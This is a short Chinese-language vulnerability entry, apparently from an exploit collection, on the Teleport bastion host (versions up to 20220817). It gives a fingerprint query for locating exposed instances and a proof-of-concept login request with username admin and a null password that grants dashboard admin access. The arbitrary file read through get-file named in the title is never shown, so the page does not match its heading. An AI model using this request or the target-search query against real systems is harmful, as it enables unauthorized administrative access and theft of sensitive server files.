# Teleport堡垒机 get-file 后台任意文件读取漏洞

## 漏洞描述

Teleport堡垒机 get-file接口存在后台任意文件读取漏洞，攻击者利用任意用户登录漏洞后可以获取后台权限，再进一步利用任意文件读取获取服务器上的敏感文件

## 漏洞影响

<a-checkbox checked>Teleport Version <= 20220817</a-checkbox></br>

## 网络测绘

<a-checkbox checked>app="TELEPORT堡垒机"</a-checkbox></br>

## 漏洞复现

登录页面

![img](../../../.vuepress/public/img/1660720653270-fcd22c8e-0df1-42ea-aa02-2c94e0770e76-20220823130906124.png)

登录后使用POC验证

```php
POST /auth/do-login

args={"type":2,"username":"admin","password":null,"captcha":"ykex","oath":"","remember":false}
```

![img](../../../.vuepress/public/img/1661087828041-1bf5d666-f5fd-4d69-9099-465b3dd492f2-20220823130904925.png)

code 返回 0 即为成功，再访问 /dashboard 获取管理员权限

![img](../../../.vuepress/public/img/1661087872154-ba6ae117-5a99-43f4-919f-1b22f403ab37-20220823130904719.png)